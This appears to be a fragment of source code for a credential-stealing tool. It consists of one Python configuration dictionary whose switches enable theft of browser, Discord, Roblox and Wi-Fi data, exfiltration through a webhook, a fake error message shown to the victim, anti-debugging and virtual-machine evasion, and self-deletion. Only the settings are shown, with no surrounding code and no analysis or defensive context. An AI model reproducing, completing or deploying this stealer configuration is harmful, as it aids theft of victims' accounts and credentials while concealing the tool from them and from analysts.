...
__CONFIG__ = {'webhook': None, 'ping': True, 'pingtype': 'Here', 'fakeerror': True, 'startup': False, 'defender': False, 'systeminfo': False, 'backupcodes': False, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': False, 'wifi': True, 'killprotector': False, 'antidebug_vm': False, 'discord': True, 'anti_spam': False, 'self_destruct': True}
